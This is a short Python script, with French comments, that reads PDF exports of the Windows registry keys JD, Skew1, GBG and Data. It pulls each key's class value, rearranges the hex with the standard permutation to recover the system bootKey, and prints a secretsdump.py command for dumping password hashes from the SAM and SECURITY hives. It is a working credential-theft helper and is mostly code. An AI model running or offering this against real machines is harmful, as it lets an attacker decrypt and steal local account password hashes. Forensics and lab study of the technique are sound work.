import fitz  # PyMuPDF
from binascii import unhexlify, hexlify

class BootKeyExtractor:
    def __init__(self, pdf_paths):
        self.pdf_paths = pdf_paths

    def pdf_to_text_all_pages(self, pdf_path):
        # Ouvrir le PDF
        pdf_document = fitz.open(pdf_path)
        text = ""
        # Itérer sur toutes les pages
        for page_number in range(len(pdf_document)):
            page = pdf_document.load_page(page_number)
            text += page.get_text()
        return text

    def extract_value_after_classe(self, text):
        lines = text.split('\n')
        for line in lines:
            if "classe :" in line.lower():
                parts = line.split(':')
                if len(parts) > 1:
                    value = parts[1].strip()
                    return value
        return None

    def process_pdfs(self):
        results = {}
        for pdf_path in self.pdf_paths:
            text = self.pdf_to_text_all_pages(pdf_path)
            classe_value = self.extract_value_after_classe(text)
            results[pdf_path] = classe_value
        return results

    def getBootKey(self):
        results = self.process_pdfs()
        bootKey = b''
        tmpKey = b''
        keys = ['jd.pdf', 'skew1.pdf', 'gbg.pdf', 'data.pdf']
        
        for key in keys:
            classe_value = results.get(key)
            if classe_value:
                print(f"classe_value for {key}: {classe_value}")
                classe_value = classe_value.strip()
                filtered_digit = ''.join(c for c in classe_value if c.lower() in '0123456789abcdef')
                if filtered_digit:
                    tmpKey += filtered_digit.encode()

        if len(tmpKey) % 2 != 0:
            print("Warning: tmpKey length is not even, adjusting...")
            tmpKey = tmpKey[:-1]

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]

        try:
            tmpKey = unhexlify(tmpKey)
        except Exception as e:
            print(f"Error converting tmpKey to bytes: {e}")
            return b''

        for i in range(len(tmpKey)):
            bootKey += tmpKey[transforms[i]:transforms[i] + 1]

        print(f'Target system bootKey: {hexlify(bootKey).decode("utf-8")}')
        print(f'secretsdump.py -sam SAM.hive -security SECURITY.hive -bootkey {hexlify(bootKey).decode("utf-8")}')
        return bootKey

pdf_paths = ['jd.pdf', 'gbg.pdf', 'skew1.pdf', 'data.pdf']  # Remplacez par les chemins de vos fichiers PDF
extractor = BootKeyExtractor(pdf_paths)
extractor.getBootKey()
